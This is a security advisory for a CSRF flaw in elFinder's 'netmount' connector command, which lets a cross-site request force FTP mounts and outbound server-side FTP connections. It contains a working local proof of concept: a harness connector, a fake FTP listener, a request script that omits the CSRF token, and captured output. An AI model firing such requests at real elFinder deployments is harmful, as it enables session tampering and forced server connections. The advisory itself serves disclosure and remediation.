# [M] elFinder: CSRF in netmount allows forced FTP mounts and server-side FTP connections

## Summary
Severity: Medium
Advisory: GHSA-9hjf-w35w-6vx2
CVE: CVE-2026-81890
CWE: CWE-352
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N (CVSS_V3)
Published: 2026-09-02
Source: https://github.com/advisories/GHSA-9hjf-w35w-6vx2
Type: github-advisory

## Affected
- Packagist: `studio-42/elfinder` — affected >=0 <2.1.70

## Details
### Summary
The PHP connector's CSRF gate protects many mutating commands, but it does not protect the `netmount` connector command. In the shipped minimal connector setup, FTP network mounting is enabled by default, so a cross-site request can force an elFinder instance to mount an attacker-chosen FTP endpoint in the victim's session and cause the server to initiate an outbound FTP connection without the `X-elFinder-CSRF` token that other state-changing commands require.

This was confirmed locally against `Studio-42/elFinder` at commit `ec5f811dc321a053085b994966f553eaaab58721`, corresponding to the repository's documented stable release `2.1.69` / API revision `2.1.69`.

### Details
The connector has an explicit allowlist of commands that require CSRF validation in `php/elFinderConnector.class.php:79-92`. That list includes state-changing commands such as `mkdir`, `mkfile`, `paste`, `put`, `rename`, `rm`, `upload`, `archive`, `extract`, `resize`, and `chmod`, but it omits `netmount`. The enforcement point in `php/elFinderConnector.class.php:376-381` calls `validateCsrfToken()` only when the command appears in that list.

`netmount` is a first-class connector command declared in `php/elFinder.class.php:248-278`, specifically `php/elFinder.class.php:263`, with attacker-controlled `protocol`, `host`, `path`, `port`, `user`, `pass`, `alias`, and `options` arguments. Its implementation in `php/elFinder.class.php:1560-1660` resolves the requested network driver, copies request arguments into a volume options array, calls the driver's `netmountPrepare()`, mounts the volume online, and persists successful network volume options in the session with `saveNetVolumes()` at `php/elFinder.class.php:1642-1649`.

The documented minimal installation path tells users to rename `/php/connector.minimal.php-dist` and load elFinder (`README.md:105-120`). That shipped minimal connector explicitly enables FTP network mounts at `php/connector.minimal.php-dist:42-43`:

```php
// // Enable FTP connector netmount
elFinder::$netDrivers['ftp'] = 'FTP';
```

The FTP driver then uses request-controlled connection parameters. `php/elFinderVolumeFTP.class.php:164-215` initializes the host, port, user, password, path, and netmount key, and `php/elFinderVolumeFTP.class.php:264-327` calls `ftp_connect()` / `ftp_ssl_connect()`, `ftp_login()`, `ftp_raw()`, `ftp_chdir()`, `ftp_pwd()`, `ftp_pasv()`, `FEAT`, and `MLST` against the supplied endpoint. The local proof showed those FTP commands reaching a fake local FTP server.

False-positive checks performed:

- `mkdir` without the CSRF header was rejected with HTTP 403 and `csrfReload:true`, proving the harness exercised the connector's CSRF gate.
- `netmount` without the same CSRF header succeeded with HTTP 200 and an `added` network-volume response.
- The fake FTP server observed an inbound connection and FTP command sequence from the PHP process.
- No custom application authentication, external service, public infrastructure, or destructive action was used.
- Sibling netmount drivers were reviewed; FTP is the relevant default/common exposure because the minimal connector enables it, while SFTP/cloud drivers require extra configuration or credentials.

Candidate score: 16/18 under the audit rubric. Reachability 2, attacker control 2, privilege required 2, sink impact 2, mitigation weakness 2, default exposure 2, safe reproduction 2, static certainty 2, false-positive resistance 2. The exploitability gate is satisfied for this issue as a confirmed CSRF/state-change and server-side FTP connection primitive in the shipped minimal connector configuration.

### PoC
The following safe local reproduction uses only a disposable connector under `/tmp`, the repository's PHP classes, PHP's built-in local web server, and a fake FTP listener bound to `127.0.0.1`. It does not contact external systems.

1. From a clean checkout of `Studio-42/elFinder` at commit `ec5f811dc321a053085b994966f553eaaab58721`, create a disposable harness:

```sh
mkdir -p /tmp/elfinder-csrf-poc-claude/www/files/.trash/.tmb /tmp/elfinder-csrf-poc-claude/logs
cat > /tmp/elfinder-csrf-poc-claude/www/connector.php <<'PHP'
<?php
error_reporting(E_ALL);
require '/path/to/elFinder/php/autoload.php';

elFinder::$netDrivers['ftp'] = 'FTP';

function access($attr, $path, $data, $volume, $isDir, $relpath) {
    $basename = basename($path);
    return $basename[0] === '.' && strlen($relpath) !== 1
        ? !($attr == 'read' || $attr == 'write')
        : null;
}

$opts = array(
    'roots' => array(
        array(
            'driver' => 'LocalFileSystem',
            'path' => __DIR__ . '/files/',
            'URL' => '/files/',
            'trashHash' => 't1_Lw',
            'uploadDeny' => array('all'),
            'uploadAllow' => array('text/plain'),
            'uploadOrder' => array('deny', 'allow'),
            'accessControl' => 'access'
        ),
        array(
            'id' => '1',
            'driver' => 'Trash',
            'path' => __DIR__ . '/files/.trash/',
            'tmbURL' => '/files/.trash/.tmb/',
            'uploadDeny' => array('all'),
            'uploadAllow' => array('text/plain'),
            'uploadOrder' => array('deny', 'allow'),
            'accessControl' => 'access'
        ),
    )
);

$connector = new elFinderConnector(new elFinder($opts));
$connector->run();
PHP
```

2. Start this minimal fake FTP server as `/tmp/elfinder-csrf-poc-claude/fake_ftp.py`:

```python
#!/usr/bin/env python3
import socket, sys
HOST = '127.0.0.1'
PORT = int(sys.argv[1])
LOG = sys.argv[2]
def log(line):
    with open(LOG, 'a', encoding='utf-8') as f:
        f.write(line + '\n')
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(5)
    log(f'LISTEN {HOST}:{PORT}')
    while True:
        conn, addr = s.accept()
        with conn:
            log(f'CONNECT {addr[0]}:{addr[1]}')
            conn.sendall(b'220 fake ftp ready\r\n')
            while True:
                data = b''
                while not data.endswith(b'\n'):
                    chunk = conn.recv(1)
                    if not chunk:
                        log('CLOSE')
                        break
                    data += chunk
                if not data:
                    break
                line = data.decode('latin-1', errors='replace').strip()
                log('CMD ' + line)
                cmd = line.split(' ', 1)[0].upper()
                if cmd == 'USER': conn.sendall(b'331 password required\r\n')
                elif cmd == 'PASS': conn.sendall(b'230 login ok\r\n')
                elif cmd.startswith('OPTS'): conn.sendall(b'200 ok\r\n')
                elif cmd == 'HELP': conn.sendall(b'214 fake help\r\n')
                elif cmd == 'CWD': conn.sendall(b'250 cwd ok\r\n')
                elif cmd == 'PWD': conn.sendall(b'257 "/"\r\n')
                elif cmd == 'FEAT': conn.sendall(b'211-Features\r\n MLST type*;size*;modify*;perm*;\r\n211 End\r\n')
                elif cmd == 'MLST': conn.sendall(b'250-Listing /\r\n type=dir;size=0;modify=20260101000000;perm=el; /\r\n250 End\r\n')
                elif cmd == 'PASV': conn.sendall(b'502 passive unavailable\r\n')
                elif cmd == 'QUIT':
                    conn.sendall(b'221 bye\r\n')
                    break
                else: conn.sendall(b'200 ok\r\n')
```

3. Start the local services:

```sh
php -S 127.0.0.1:8765 -t /tmp/elfinder-csrf-poc-claude/www
python3 /tmp/elfinder-csrf-poc-claude/fake_ftp.py 21210 /tmp/elfinder-csrf-poc-claude/logs/ftp.log
```

4. In another shell, run this control-and-positive test. It intentionally omits `X-elFinder-CSRF` from both the protected `mkdir` control request and the `netmount` request:

```python
import json, urllib.parse, urllib.request, urllib.error, http.cookiejar
base = 'http://127.0.0.1:8765/connector.php'
log = '/tmp/elfinder-csrf-poc-claude/logs/ftp.log'
open(log, 'w', encoding='utf-8').close()
cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
def request(params, timeout=12):
    url = base + '?' + urllib.parse.urlencode(params)
    try:
        with opener.open(url, timeout=timeout) as resp:
            return resp.status, resp.read().decode('utf-8', errors='replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', errors='replace')
status, body = request({'cmd':'open','init':'1','target':'l1_Lw'})
opened = json.loads(body)
target = opened.get('cwd', {}).get('hash', 'l1_Lw')
print('OPEN_STATUS=' + str(status))
print('OPEN_HAS_CSRF=' + str('"csrf"' in body))
status, body = request({'cmd':'mkdir','target':target,'name':'csrf-control-no-header'})
print('CONTROL_MKDIR_WITHOUT_CSRF_STATUS=' + str(status))
print('CONTROL_MKDIR_WITHOUT_CSRF_BODY=' + body.replace('\n', ' ')[:160])
status, body = request({'cmd':'netmount','protocol':'ftp','host':'127.0.0.1','port':'21210','path':'/','user':'anonymous','pass':''})
print('NETMOUNT_WITHOUT_CSRF_STATUS=' + str(status))
print('NETMOUNT_WITHOUT_CSRF_HAS_ADDED=' + str('"added"' in body))
print('NETMOUNT_WITHOUT_CSRF_BODY=' + body.replace('\n', ' ')[:260])
print('FTP_LOG=')
print(open(log, encoding='utf-8', errors='replace').read().strip())
```

Observed output from the final local re-run in this environment:

```text
OPEN_STATUS=200
OPEN_HAS_CSRF=True
CONTROL_MKDIR_WITHOUT_CSRF_STATUS=403
CONTROL_MKDIR_WITHOUT_CSRF_BODY={"error":["errPerm","Invalid request. Please reload."],"csrfReload":true}
NETMOUNT_WITHOUT_CSRF_STATUS=200
NETMOUNT_WITHOUT_CSRF_HAS_ADDED=True
NETMOUNT_WITHOUT_CSRF_BODY={"added":[{"mime":"directory","size":0,"ts":1767225600,"read":1,"write":0,"locked":1,"hash":"fnm1_Lw","name":"anonymous@127.0.0.1","rootRev":"","options":{"path":"","url":"","tmbUrl":"self","disabled":[],"separator":"\/","copyOverwrite":1,"uploadOverwrite":1,
FTP_LOG=
CONNECT 127.0.0.1:37496
CMD USER anonymous
CMD PASS
CMD OPTS UTF8 ON
CMD HELP
CMD epsv4 off
CMD PASV
CMD CWD /
CMD PWD
CMD FEAT
CMD MLST /
CLOSE
```

The negative/control case is the `mkdir` request: without `X-elFinder-CSRF`, it returns HTTP 403 and `csrfReload:true`. The positive case is `netmount`: without `X-elFinder-CSRF`, it returns HTTP 200 with `added` and the fake FTP server logs the server-side FTP connection.

Cleanup:

```sh
# Stop the two local server processes, then remove the disposable harness.
rm -rf /tmp/elfinder-csrf-poc-claude
```

### Impact
An attacker who can cause a victim browser to request the connector can bypass the intended CSRF protection for `netmount`. In the shipped minimal connector configuration, this lets the attacker:

- force the victim's elFinder session to persist an attacker-chosen FTP network volume;
- cause the PHP server to initiate an outbound FTP connection to an attacker-chosen host and port;
- send attacker-supplied FTP username/password values to that endpoint; and
- expose the victim's later file-manager UI to the mounted remote volume.

The proof demonstrates a security boundary mismatch: the same connector rejects another mutating command without the CSRF header but accepts `netmount` without it. The observed server-side FTP command sequence confirms that the request reaches the network sink, not just a harmless JSON code path.

The impact is bounded by deployment and browser behavior. In a deployment with no surrounding authentication, direct callers may be able to use the connector normally; in the common authenticated-file-manager deployment model, the missing `netmount` CSRF check lets a cross-site attacker perform this state-changing/server-side network action in the victim's authenticated session.

### Suggested remediation
Require CSRF validation for `netmount`, including `protocol=netunmount`, before executing the command. The minimal fix is to add `netmount` to `elFinderConnector::$csrfProtectedCmds` in `php/elFinderConnector.class.php`.

Also consider adding defense-in-depth validation for network mount destinations, especially FTP/SFTP hostnames and IPs, because the current FTP netmount path accepts local/private/link-local addresses unlike URL upload validation. If local/private network mounts are intentionally supported, expose that as an explicit opt-in connector configuration rather than the default sample behavior.

Suggested regression tests:

- A request to `cmd=netmount&protocol=ftp&host=127.0.0.1&port=<local-port>` without `X-elFinder-CSRF` must return HTTP 403 and must not connect to the FTP listener.
- The same request with the valid token from `cmd=open&init=1` should preserve intended behavior for authorized users.
- `protocol=netunmount` should also reject missing/invalid CSRF tokens.

### Credits
- Thai Son Dinh from VinSOC Labs (R&D)
- Nguyen Huy Vu Dung from VinSOC Labs (AppSec)

## References
- https://github.com/Studio-42/elFinder/security/advisories/GHSA-9hjf-w35w-6vx2
- https://nvd.nist.gov/vuln/detail/CVE-2026-81890
- https://github.com/Studio-42/elFinder/commit/31284facd033e081b2b69c08873b39c8a413b762
- https://github.com/Studio-42/elFinder/commit/36d40fff12222ad4c229d8889d8ed3fd3dbf0415
- https://github.com/Studio-42/elFinder
- https://github.com/Studio-42/elFinder/releases/tag/2.1.70
